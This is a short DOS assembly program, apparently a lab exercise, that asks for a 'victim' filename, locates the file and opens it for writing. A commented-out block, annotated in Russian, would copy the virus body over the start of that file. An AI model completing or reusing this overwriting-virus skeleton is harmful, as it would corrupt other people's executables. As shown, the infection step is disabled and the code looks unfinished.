.model tiny
.code
org 100h
start:

    lea ax, data

    ; print input request
    lea dx, input_msg
    mov ah, 09h
    int 21h

    ; buffered input
    lea dx, filename
    mov ah, 0ah
    int 21h

    ; console endl
    mov dl, 10
    mov ah, 02h
    int 21h

    ; preparing filename
    lea bx, filename.text
    push bx
    mov al, filename.len
    mov ah, 00h
    add bx, ax
    mov byte ptr[bx], 0

    ; set dta on file
    mov ah, 1ah
    lea dx, file
    int 21h

    ; find victim file
    pop dx ; get filename.text address from stack
    mov ah, 4eh
    int 21h

    ; output found file name
    lea dx, file.name
    mov ah, 09h
    int 21h

    ; open file
    mov ax, 3D02h
    lea dx, file.name
    int 21h

    ; ; записываем тело вируса в начало файла
    ; xchg ax,bx
    ; mov dx,100h
    ; mov ah,40h
    ; mov cl,vir_len
    ; int 21h

    ; ; закрываем файл и выходим
    ; mov ah,3eh
    ; int 21h
    ; ret

    mov ah, 4ch
    int 21h

data:
    
    ; 13-byte string for filename
    Str13 struc
    max db 13
    len db ?
    text db 13 dup(?)
    Str13 ends

    ; DTA buffer structure
    DTAFileInfo struc
    reserved db 21 dup(?)
    attr db ?
    time dw ?
    date dw ?
    size dd ?
    name db 13 dup(?)
    ends

    filename Str13 <>
    file DTAFileInfo <>

    file_mask db 'lab3v.com', 0
    err_msg db 'Error, can not find or open such file.','$'
    input_msg db 'Input the target filename >> ','$'

end start